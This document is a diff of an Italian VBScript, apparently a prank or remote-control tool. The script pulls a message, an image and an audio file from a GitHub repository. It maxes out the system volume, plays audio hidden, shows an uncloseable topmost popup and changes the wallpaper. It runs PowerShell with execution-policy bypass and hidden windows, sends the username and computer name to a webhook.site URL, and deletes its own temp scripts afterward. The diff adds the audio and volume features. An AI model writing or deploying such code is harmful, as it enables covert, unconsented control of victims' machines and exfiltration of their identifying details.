@@ -1,111 +1,147 @@
 Option Explicit
 On Error Resume Next
- 
-Dim shell, fso, urlImmagine, urlMessaggio, percorsoLocale, percorsoScript, scriptPS, messaggioDalWeb, xmlHttp
-Dim webhookURL, nomeUtente, nomePC
- 
-' URL ottimizzati per il download diretto
+
+Dim shell, fso, xmlHttp
+Dim urlImmagine, urlMessaggio, urlAudio, webhookURL
+Dim percorsoLocaleImg, percorsoScriptWp, scriptWp, percorsoAudio, scriptDownloadAudio
+Dim messaggioDalWeb, nomeUtente, nomePC, i
+
+' --- CONFIGURAZIONE URL ---
 urlImmagine = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine.jpg"
 urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt"
+urlAudio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio.mp3"
 webhookURL = "https://webhook.site/dfe155b6-716f-42af-a803-bab2e390fd9c"
- 
+
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
- 
+
 ' Ottieni informazioni sistema
 nomeUtente = shell.ExpandEnvironmentStrings("%USERNAME%")
 nomePC = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
- 
-' --- 1. RECUPERA IL MESSAGGIO ---
+
+' --- 1. CONFIGURAZIONE VOLUME (UNMUTE + MAX) ---
+' Invia il tasto Volume Mute (per assicurarsi che si "svegli" se mutato) e poi alza
+shell.SendKeys Chr(&hAD) 
+For i = 1 To 50
+    shell.SendKeys Chr(&hAF) ' Volume Up
+Next
+
+' --- 2. DOWNLOAD DELL'AUDIO ---
+percorsoAudio = shell.ExpandEnvironmentStrings("%TEMP%") & "\audio.mp3"
+scriptDownloadAudio = shell.ExpandEnvironmentStrings("%TEMP%") & "\dl_audio.ps1"
+
+' Creiamo uno script PowerShell dedicato solo al download (più affidabile)
+Dim psDownload
+psDownload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
+             "try { (New-Object System.Net.WebClient).DownloadFile('" & urlAudio & "', '" & percorsoAudio & "'); } catch {}"
+
+Dim fAudio
+Set fAudio = fso.CreateTextFile(scriptDownloadAudio, True)
+fAudio.Write psDownload
+fAudio.Close
+
+' Eseguiamo il download e attendiamo che finisca (True)
+shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & scriptDownloadAudio & """", 0, True
+
+' --- 3. RIPRODUZIONE AUDIO DIRETTA ---
+' Usiamo direttamente l'eseguibile wmplayer.exe.
+' Il numero 7 alla fine significa "ShowMinNoActive" (Ridotto a icona e senza focus)
+' Questo bypassa la richiesta "Apri con" perché chiamiamo l'EXE direttamente.
+If fso.FileExists(percorsoAudio) Then
+    shell.Run "wmplayer.exe """ & percorsoAudio & """ /Play", 7, False
+End If
+
+' --- 4. RECUPERA IL MESSAGGIO ---
 Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 xmlHttp.Open "GET", urlMessaggio, False
 xmlHttp.Send
 If xmlHttp.Status = 200 Then
     messaggioDalWeb = Trim(xmlHttp.responseText)
 End If
- 
-' --- 2. MOSTRA IL POPUP (Solo se il messaggio non è vuoto) ---
+
+' --- 5. MOSTRA IL POPUP E INVIA NOTIFICA ---
 If messaggioDalWeb <> "" Then
     Dim comandoPopup
     comandoPopup = "powershell -WindowStyle Hidden -NoProfile -Command ""Add-Type -AssemblyName System.Windows.Forms; " & _
-        "$form = New-Object System.Windows.Forms.Form; $form.Text = 'GEA'; $form.Size = New-Object System.Drawing.Size(400,180); " & _
+        "$form = New-Object System.Windows.Forms.Form; $form.Text = 'SISTEMA'; $form.Size = New-Object System.Drawing.Size(400,180); " & _
         "$form.StartPosition = 'CenterScreen'; $form.FormBorderStyle = 'FixedDialog'; $form.ControlBox = $false; $form.TopMost = $true; " & _
         "$label = New-Object System.Windows.Forms.Label; $label.Text = '" & messaggioDalWeb & "'; $label.TextAlign = 'MiddleCenter'; $label.Dock = 'Fill'; " & _
         "$label.Font = New-Object System.Drawing.Font('Segoe UI', 11); " & _
         "$form.Controls.Add($label); $panel = New-Object System.Windows.Forms.Panel; $panel.Dock = 'Bottom'; $panel.Height = 50; " & _
         "$btn = New-Object System.Windows.Forms.Button; $btn.Text = 'OK'; $btn.Left = 160; $btn.Top = 10; $btn.Add_Click({$form.Close()}); " & _
         "$panel.Controls.Add($btn); $form.Controls.Add($panel); $form.ShowDialog() | Out-Null"""
+    
+    ' Mostra il popup (il codice attende la chiusura con True)
     shell.Run comandoPopup, 0, True
     
-    ' --- INVIA NOTIFICA DISCORD CON POWERSHELL ---
+    ' Invia notifica Discord
     InviaNotificaDiscordPS webhookURL, nomeUtente, nomePC, messaggioDalWeb
 End If
- 
-' --- 3. CAMBIO SFONDO ---
-percorsoLocale = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\bg_data.jpg"
-percorsoScript = shell.ExpandEnvironmentStrings("%TEMP%") & "\sys_task.ps1"
- 
-' PowerShell scarica l'immagine e forza l'aggiornamento dei parametri di sistema
-scriptPS = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { " & _
-    "(New-Object System.Net.WebClient).DownloadFile('" & urlImmagine & "', '" & percorsoLocale & "'); " & _
-    "if (Test-Path '" & percorsoLocale & "') { " & _
-    "$path = (Get-Item '" & percorsoLocale & "').FullName; " & _
+
+' --- 6. CAMBIO SFONDO ---
+percorsoLocaleImg = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\bg_data.jpg"
+percorsoScriptWp = shell.ExpandEnvironmentStrings("%TEMP%") & "\sys_task.ps1"
+
+scriptWp = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { " & _
+    "(New-Object System.Net.WebClient).DownloadFile('" & urlImmagine & "', '" & percorsoLocaleImg & "'); " & _
+    "if (Test-Path '" & percorsoLocaleImg & "') { " & _
+    "$path = (Get-Item '" & percorsoLocaleImg & "').FullName; " & _
     "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $path; " & _
     "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'; " & _
     "$code = @' " & vbCrLf & _
     "using System; using System.Runtime.InteropServices; " & vbCrLf & _
     "public class Wallpaper { [DllImport(""user32.dll"")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); } " & vbCrLf & _
     "'@; Add-Type -TypeDefinition $code; [Wallpaper]::SystemParametersInfo(0x0014, 0, $path, 0x0003); } } catch {}"
- 
-Dim f
-Set f = fso.CreateTextFile(percorsoScript, True)
-f.Write scriptPS
-f.Close
- 
-shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & percorsoScript & """", 0, True
- 
-' --- 4. PULIZIA ---
-WScript.Sleep 5000
-If fso.FileExists(percorsoScript) Then fso.DeleteFile percorsoScript
- 
-' --- FUNZIONE PER INVIARE NOTIFICA DISCORD VIA POWERSHELL ---
+
+Dim fWp
+Set fWp = fso.CreateTextFile(percorsoScriptWp, True)
+fWp.Write scriptWp
+fWp.Close
+
+shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & percorsoScriptWp & """", 0, True
+
+' --- 7. PULIZIA ---
+WScript.Sleep 3000
+If fso.FileExists(percorsoScriptWp) Then fso.DeleteFile percorsoScriptWp
+If fso.FileExists(scriptDownloadAudio) Then fso.DeleteFile scriptDownloadAudio
+' NOTA: Non cancelliamo l'audio subito altrimenti smette di suonare mentre il popup è aperto.
+' Si può aggiungere una pulizia all'avvio successivo o lasciarlo in TEMP.
+
+' --- FUNZIONE NOTIFICA DISCORD ---
 Sub InviaNotificaDiscordPS(webhook, utente, pc, messaggio)
     On Error Resume Next
-    Dim scriptWebhook, percorsoWebhook, messaggioEscaped
+    Dim scriptWebhook, percorsoWebhook, messaggioEscaped, fwh
     
-    ' Escape delle virgolette nel messaggio
     messaggioEscaped = Replace(messaggio, """", "\""")
     messaggioEscaped = Replace(messaggioEscaped, "'", "''")
     
     percorsoWebhook = shell.ExpandEnvironmentStrings("%TEMP%") & "\webhook_notify.ps1"
     
-    ' Script PowerShell per inviare il webhook
     scriptWebhook = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
-                   "$webhook = '" & webhook & "'; " & _
-                   "$payload = @{" & _
-                   "content = 'Popup visualizzato'; " & _
-                   "embeds = @(@{" & _
-                   "title = 'Notifica Script'; " & _
-                   "color = 5814783; " & _
-                   "fields = @(" & _
-                   "@{name='Utente'; value='" & utente & "'; inline=$true}," & _
-                   "@{name='PC'; value='" & pc & "'; inline=$true}," & _
-                   "@{name='Messaggio'; value='" & messaggioEscaped & "'; inline=$false}," & _
-                   "@{name='Timestamp'; value='" & Now() & "'; inline=$false}" & _
-                   "); " & _
-                   "footer = @{text='Script Execution Log'}" & _
-                   "})" & _
-                   "} | ConvertTo-Json -Depth 4; " & _
-                   "Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'"
+                    "$webhook = '" & webhook & "'; " & _
+                    "$payload = @{" & _
+                    "content = 'Script Eseguito'; " & _
+                    "embeds = @(@{" & _
+                    "title = 'Report Attività'; " & _
+                    "color = 16711680; " & _
+                    "fields = @(" & _
+                    "@{name='Utente'; value='" & utente & "'; inline=$true}," & _
+                    "@{name='PC'; value='" & pc & "'; inline=$true}," & _
+                    "@{name='Messaggio Visualizzato'; value='" & messaggioEscaped & "'; inline=$false}," & _
+                    "@{name='Audio'; value='Avviato con WMPlayer'; inline=$false}," & _
+                    "@{name='Timestamp'; value='" & Now() & "'; inline=$false}" & _
+                    "); " & _
+                    "footer = @{text='Remote Script Log'}" & _
+                    "})" & _
+                    "} | ConvertTo-Json -Depth 4; " & _
+                    "Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'"
     
-    Set f = fso.CreateTextFile(percorsoWebhook, True)
-    f.Write scriptWebhook
-    f.Close
+    Set fwh = fso.CreateTextFile(percorsoWebhook, True)
+    fwh.Write scriptWebhook
+    fwh.Close
     
     shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & percorsoWebhook & """", 0, True
     
     WScript.Sleep 2000
     If fso.FileExists(percorsoWebhook) Then fso.DeleteFile percorsoWebhook
 End Sub
-
-
